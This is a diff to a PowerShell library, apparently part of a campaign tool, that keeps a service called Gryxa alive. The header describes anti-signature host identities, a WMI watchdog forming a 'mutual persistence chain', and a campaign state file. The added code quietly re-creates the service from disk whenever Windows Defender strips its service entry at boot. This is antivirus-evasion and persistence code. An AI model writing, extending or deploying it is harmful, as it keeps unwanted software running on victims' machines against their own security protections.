@@ -1,9 +1,9 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L35
+# OWN_LIB  BUILD 20260802L36
 # Shared library: per-host identity (anti-signature), WMI watchdog
 # (mutual persistence chain), campaign state file, SC service repair.
-# L35: preclean moved INSIDE detached wrapper so ensure returns instantly (10s Run-tool cap was killing ensure before spawn). L34: phantom-reg purge.
+# L36: STUCK/ABSENT with binaries on disk -> Repair-SCService re-creates stripped service (boot-time Defender strip), no download/reinstall. L35: -NoWait detached ensure.
 # L21: stuck registered (svc+dir gone) -> /fa then ARP nuke + same-FP /i; return fix.
 # L20: -Deep must not skip light start/repair (rate-limit left Gryxa Stopped).
 # L19: rate-limit never blocks when Gryxa fully absent; StartPending keep.
@@ -692,6 +692,13 @@ function Invoke-GryxaEnsure {
             return "HEALTHY|$newFp|install-spawned=1"
         }
         'STUCK' {
+            # L36: if the binaries survived (e.g. Defender stripped only the service entry at
+            # boot) re-create the service from disk — no download, no reinstall, heals in secs.
+            if (Test-ScDir $fp) {
+                GLog "stuck_service_recreate fp=$fp"
+                Repair-SCService $fp
+                if (Test-ScRunning $fp) { GLog 'service_recreated_ok'; return "HEALTHY|$fp|svc-recreated=1" }
+            }
             $msi = Get-GryxaMsi
             if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
             $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
@@ -704,6 +711,12 @@ function Invoke-GryxaEnsure {
             return "HEALTHY|$newFp|install-spawned=1"
         }
         default {
+            # L36: ABSENT but binaries on disk -> service entry stripped; re-create, no reinstall.
+            if (Test-ScDir $fp) {
+                GLog "absent_service_recreate fp=$fp"
+                Repair-SCService $fp
+                if (Test-ScRunning $fp) { GLog 'service_recreated_ok'; return "HEALTHY|$fp|svc-recreated=1" }
+            }
             $msi = Get-GryxaMsi
             if (-not $msi) { GLog 'msi_unavailable'; return "UNHEALTHY|$fp|msi-unavailable" }
             $newFp = Get-FpFromProductName (Get-MsiProperty $msi 'ProductName')
